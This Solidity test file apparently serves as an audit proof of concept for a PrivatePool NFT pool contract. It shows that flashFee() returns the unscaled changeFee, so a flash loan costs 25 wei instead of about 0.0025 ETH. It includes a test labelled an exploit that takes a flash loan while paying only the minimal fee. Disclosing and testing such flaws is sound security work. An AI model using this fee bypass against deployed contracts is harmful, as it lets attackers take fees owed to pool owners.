// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "../Fixture.sol";
import "../shared/FlashBorrower.sol";
import "../../src/PrivatePool.sol";

/**
 * @title ExploitTest - Flash Fee Scaling Vulnerability
 * @dev This test demonstrates the flash fee scaling vulnerability in PrivatePool
 *
 * VULNERABILITY:
 * The changeFee variable is meant to have 4 decimal precision for change operations,
 * but the flashFee() function returns the raw changeFee value without proper scaling.
 *
 * IMPACT:
 * - changeFee = 25 should represent 0.0025 ETH for change operations (25 * 10^(18-4) = 25 * 10^14)
 * - But flashFee() returns only 25 wei instead of 0.0025 ETH
 * - This results in significantly lower flash loan fees than intended
 */
contract ExploitTest is Fixture {
    using stdStorage for StdStorage;

    FlashBorrower flashBorrower;
    PrivatePool privatePool;

    // Test constants
    uint56 constant CHANGE_FEE_RAW = 25; // Should represent 0.0025 ETH with 4 decimals
    uint256 constant EXPECTED_CHANGE_FEE_ETH = 25 * 10**14; // 0.0025 ETH = 25 * 10^(18-4)
    uint256 constant ACTUAL_FLASH_FEE_WEI = 25; // What flashFee() actually returns

    function setUp() public {
        // Create pool with changeFee = 25 (intended to be 0.0025 ETH)
        privatePool = factory.create{value: 1e18}(
            address(0), // ETH as base token
            address(milady), // NFT
            100e18, // virtualBaseTokenReserves
            10e18, // virtualNftReserves
            CHANGE_FEE_RAW, // changeFee = 25 (should be 0.0025 ETH)
            100, // feeRate
            bytes32(0), // merkleRoot
            true, // useStolenNftOracle
            false, // payRoyalties
            bytes32(address(this).balance),
            new uint256[](0),
            1e18
        );

        // Mint NFT to the pool for flash loan testing
        milady.mint(address(privatePool), 1);

        // Create flash borrower
        flashBorrower = new FlashBorrower(privatePool);
    }

    /**
     * @notice Demonstrates the flash fee scaling vulnerability
     *
     * This test shows that:
     * 1. changeFeeQuote properly scales changeFee for change operations
     * 2. flashFee returns the raw changeFee value without scaling
     * 3. This creates a massive discrepancy between intended and actual flash loan fees
     */
    function testFlashFeeScalingVulnerability() public {
        // Test change fee calculation (correctly scaled)
        uint256 inputWeight = 1e18; // Weight for 1 NFT
        (uint256 changeFeeAmount,) = privatePool.changeFeeQuote(inputWeight);

        // Test flash fee calculation (incorrectly not scaled)
        uint256 flashFeeAmount = privatePool.flashFee(address(milady), 1);

        // Log the values for clarity
        console.log("=== VULNERABILITY DEMONSTRATION ===");
        console.log("Raw changeFee value:", CHANGE_FEE_RAW);
        console.log("Expected change fee (scaled):", changeFeeAmount);
        console.log("Actual flash fee (not scaled):", flashFeeAmount);
        console.log("Vulnerability factor:", changeFeeAmount / flashFeeAmount);

        // Verify change fee is properly scaled (should be 0.0025 ETH = 2.5e14 wei)
        assertEq(
            changeFeeAmount,
            EXPECTED_CHANGE_FEE_ETH,
            "Change fee should be properly scaled to 0.0025 ETH"
        );

        // Verify flash fee is NOT scaled (vulnerability - only 25 wei)
        assertEq(
            flashFeeAmount,
            ACTUAL_FLASH_FEE_WEI,
            "Flash fee incorrectly returns raw changeFee without scaling"
        );

        // Demonstrate the massive discrepancy
        assertGt(
            changeFeeAmount / flashFeeAmount,
            1e12, // At least 1 trillion times difference
            "Flash fee should be drastically lower than intended"
        );
    }

    /**
     * @notice Exploits the vulnerability by paying minimal flash loan fees
     *
     * This test demonstrates how an attacker can exploit the vulnerability
     * to pay almost no fees for flash loans.
     */
    function testExploitMinimalFlashLoanFees() public {
        // Get the actual flash fee (only 25 wei due to vulnerability)
        uint256 flashFeeAmount = privatePool.flashFee(address(milady), 1);

        // Fund flash borrower with just the minimal fee
        deal(address(flashBorrower), flashFeeAmount);

        // Record balances before flash loan
        uint256 poolBalanceBefore = address(privatePool).balance;
        uint256 borrowerBalanceBefore = address(flashBorrower).balance;

        // Execute flash loan paying minimal fees
        flashBorrower.initiateFlashLoan(address(milady), 1, "");

        // Record balances after flash loan
        uint256 poolBalanceAfter = address(privatePool).balance;
        uint256 borrowerBalanceAfter = address(flashBorrower).balance;

        // Verify only minimal fees were paid
        assertEq(
            poolBalanceAfter - poolBalanceBefore,
            flashFeeAmount,
            "Pool should have received only minimal flash fee"
        );

        assertEq(
            borrowerBalanceBefore - borrowerBalanceAfter,
            flashFeeAmount,
            "Borrower should have paid only minimal flash fee"
        );

        console.log("=== EXPLOIT RESULTS ===");
        console.log("Flash fee paid:", flashFeeAmount, "wei");
        console.log("Intended flash fee should have been:", EXPECTED_CHANGE_FEE_ETH, "wei");
        console.log("Fee savings:", EXPECTED_CHANGE_FEE_ETH - flashFeeAmount, "wei");
        console.log("Exploit success: Attacker paid", (flashFeeAmount * 100) / EXPECTED_CHANGE_FEE_ETH, "% of intended fee");
    }

    }